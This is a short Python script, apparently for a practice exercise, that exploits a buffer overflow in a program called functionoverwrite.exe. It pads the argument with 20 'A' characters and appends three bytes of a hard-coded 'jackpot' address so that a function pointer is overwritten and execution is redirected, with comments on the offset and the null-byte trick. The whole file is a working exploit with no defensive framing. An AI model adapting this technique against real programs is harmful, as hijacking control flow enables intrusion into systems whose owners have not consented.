#!/usr/bin/python
import sys, subprocess, struct

#20+4+8+4=36 would overwrite 'r', but we only want to hit the func ptr

jackpot = 0x401591
#we only take 3 of the 4 bytes because strings cannot have a null,
#but will be null terminated terminated to complete the dword address
jackpot_packed = struct.pack('L', jackpot)[0:3]

arg = "A" * 20
arg += jackpot_packed
#or
#arg += "\x91\x15\x40"

subprocess.call(['functionoverwrite.exe', arg])